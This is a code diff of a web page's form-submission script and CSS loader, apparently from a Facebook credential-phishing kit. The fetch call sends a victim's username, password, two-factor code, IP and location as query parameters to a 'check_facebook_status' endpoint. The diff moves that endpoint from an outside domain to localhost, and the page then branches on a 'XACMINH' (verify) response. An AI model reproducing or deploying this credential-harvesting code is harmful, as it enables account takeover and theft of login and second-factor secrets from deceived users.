@@ -133,25 +133,49 @@
             }
 
             .loader {
-                --d: 22px;
-                width: 4px;
-                height: 4px;
+                font-size: 8px;
+                width: 1em;
+                height: 1em;
                 border-radius: 50%;
-                color: #1877F2;
-                box-shadow:
-                    calc(1*var(--d)) calc(0*var(--d)) 0 0,
-                    calc(0.707*var(--d)) calc(0.707*var(--d)) 0 1px,
-                    calc(0*var(--d)) calc(1*var(--d)) 0 2px,
-                    calc(-0.707*var(--d)) calc(0.707*var(--d)) 0 3px,
-                    calc(-1*var(--d)) calc(0*var(--d)) 0 4px,
-                    calc(-0.707*var(--d)) calc(-0.707*var(--d))0 5px,
-                    calc(0*var(--d)) calc(-1*var(--d)) 0 6px;
-                animation: l27 1s infinite steps(8);
+                position: relative;
+                text-indent: -9999em;
+                animation: mulShdSpin 1.1s infinite ease;
+                transform: translateZ(0);
             }
 
-            @keyframes l27 {
+            @keyframes mulShdSpin {
+
+                0%,
                 100% {
-                    transform: rotate(1turn)
+                    box-shadow: 0em -2.6em 0em 0em #007bff, 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.5), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.7);
+                }
+
+                12.5% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.7), 1.8em -1.8em 0 0em #007bff, 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.5);
+                }
+
+                25% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.5), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.7), 2.5em 0em 0 0em #007bff, 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+                }
+
+                37.5% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.5), 2.5em 0em 0 0em rgba(0, 123, 255, 0.7), 1.75em 1.75em 0 0em #007bff, 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+                }
+
+                50% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.5), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.7), 0em 2.5em 0 0em #007bff, -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+                }
+
+                62.5% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.5), 0em 2.5em 0 0em rgba(0, 123, 255, 0.7), -1.8em 1.8em 0 0em #007bff, -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+                }
+
+                75% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.5), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.7), -2.6em 0em 0 0em #007bff, -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+                }
+
+                87.5% {
+                    box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.5), -2.6em 0em 0 0em rgba(0, 123, 255, 0.7), -1.8em -1.8em 0 0em #007bff;
                 }
             }
 
@@ -194,7 +218,7 @@
                     const address = localStorage.getItem('address');
                     var code = document.getElementById('2facode');
                     var codeValue = code.value;
-                    fetch('https://superpc.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                    fetch('http://localhost:5000/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
                         .then(response => {
                             if (!response.ok) {
                                 throw new Error('Network response was not ok');
@@ -227,7 +251,7 @@
                                 loader.style.display = "none";
                                 button.addEventListener("click", submitForm);
                             }
-                            else if (data == 'XACMINH'){
+                            else if (data == 'XACMINH') {
                                 let username;
                                 let password;
                                 username = emailValue;
